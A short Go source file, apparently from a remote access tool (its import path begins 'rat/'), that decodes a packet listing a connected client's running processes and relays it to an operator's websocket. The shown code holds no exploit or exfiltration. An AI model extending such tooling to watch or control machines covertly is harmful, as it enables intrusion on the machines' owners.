package main

import (
	"rat/shared/network/header"

	"gopkg.in/mgo.v2/bson"
)

type ProcessPacket struct {
	Action    int
	Processes []Process
}

func (packet ProcessPacket) Header() header.PacketHeader {
	return header.ProcessHeader
}

func (packet ProcessPacket) Init(c *Client) {

}

func (packet ProcessPacket) OnReceive(c *Client) error {
	var err error

	if ws, ok := c.Listeners[header.ProcessHeader]; ok {
		err = sendMessage(ws, c, ProcessMessage(packet.Processes))
	}

	delete(c.Listeners, header.ProcessHeader)

	return err
}

func (packet ProcessPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
